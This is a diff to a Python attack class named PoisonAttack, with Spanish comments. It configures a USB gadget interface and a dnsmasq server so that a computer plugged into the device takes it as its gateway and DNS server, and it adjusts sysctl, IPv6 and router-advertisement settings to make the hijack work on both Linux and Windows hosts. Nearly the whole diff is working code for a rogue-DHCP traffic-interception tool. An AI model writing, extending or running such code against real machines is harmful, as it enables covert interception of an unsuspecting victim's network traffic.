@@ -65,22 +65,16 @@ class PoisonAttack:
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
             time.sleep(1)
 
-            self.log("[*] Reset de interfaz y ajustes para Windows RNDIS...")
+            self.log("[*] Reset de interfaz y supresión IPv6/RA...")
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
             time.sleep(1)
             os.system(f"sudo ip link set {iface} up")
-            os.system(f"sudo ip link set {iface} arp on 2>/dev/null")
-            os.system(f"sudo ip link set {iface} multicast on 2>/dev/null")
             time.sleep(2)
 
-            # Desactivar IPv6/RA para evitar delays
+            # CRÍTICO PARA LINUX: Evita que NetworkManager espere SLAAC/Router Advertisements
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
-
-            # CRÍTICO WINDOWS RNDIS: Desactivar Reverse Path Filtering y permitir tráfico local
-            os.system(f"sudo sysctl -w net.ipv4.conf.{iface}.rp_filter=0 2>/dev/null")
-            os.system(f"sudo sysctl -w net.ipv4.conf.{iface}.accept_local=1 2>/dev/null")
 
             ip = "192.168.10.1"
             subnet_mask = "24"
@@ -92,22 +86,20 @@ class PoisonAttack:
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
-            # Configuración dnsmasq OPTIMIZADA para Windows RNDIS
+            # Configuración dnsmasq optimizada para Gadget USB (Linux/Windows)
             config_dhcp = (
                 f"interface={iface}\n"
+                f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
                 f"dhcp-option=3,{ip}\n"      # Gateway
                 f"dhcp-option=6,{ip}\n"      # DNS
-                f"dhcp-option=15,\n"         # Dominio vacío (evita NLA timeout)
-                f"dhcp-option=43,\n"         # Vendor específico (evita espera MS)
-                f"dhcp-option=44,\n"         # WINS vacío
-                f"dhcp-option=252,\n"        # WPAD vacío
-                f"bind-dynamic\n"            # Compatible con configfs
-                f"no-resolv\n"
-                f"no-hosts\n"
-                f"port=0\n"                  # Sin DNS (evita choque puerto 53)
-                f"log-dhcp\n"
-                f"dhcp-authoritative\n"      # Respuesta INMEDIATA a DHCPDISCOVER
+                f"dhcp-option=15,\n"         # Dominio vacío (evita delay Linux/Windows)
+                f"dhcp-option=252,\n"        # WPAD vacío (evita espera proxy)
+                f"bind-dynamic\n"            # Compatible con interfaces configfs
+                f"no-resolv\n"               # Evita carga de /etc/resolv.conf
+                f"no-hosts\n"                # Ignora /etc/hosts
+                f"port=0\n"                  # DESACTIVA DNS (evita choque con systemd-resolved)
+                f"log-dhcp\n"                # Loguea concesiones DHCP en stderr
             )
             with open("dnsmasq_temp.conf", "w") as f:
                 f.write(config_dhcp)
@@ -119,12 +111,13 @@ class PoisonAttack:
             )
             time.sleep(2)
 
+            # Verificación de que dnsmasq está activo y aceptando DHCP
             if self.dns_proc.poll() is not None:
                 err = self.dns_proc.stderr.read()
-                self.log(f"[!] dnsmasq falló: {err.strip()}")
-                self.log("[*] Reiniciando dnsmasq en modo fallback...")
+                self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
+                self.log("[*] Reiniciando en modo fallback...")
                 self.dns_proc = subprocess.Popen(
-                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
+                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                 )
             else:
